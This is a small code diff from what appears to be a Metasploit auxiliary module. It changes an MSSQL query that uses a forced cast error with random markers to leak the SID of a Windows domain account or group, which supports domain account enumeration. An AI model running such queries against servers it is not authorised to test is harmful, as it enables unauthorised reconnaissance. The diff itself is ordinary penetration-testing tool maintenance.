@@ -172,7 +172,7 @@ class Metasploit3 < Msf::Auxiliary
     clue_end = Rex::Text.rand_text_alpha(8)
 
     # Setup query
-    sql = "(select cast('#{clue_start}'+(select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('demo\\administrator')))), 1, 2, ''))+'#{clue_end}' as int))"
+    sql = "(select cast('#{clue_start}'+(select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('#{domain_group}')))), 1, 2, ''))+'#{clue_end}' as int))"
 
     # Run query
     result = mssql_query(sql)
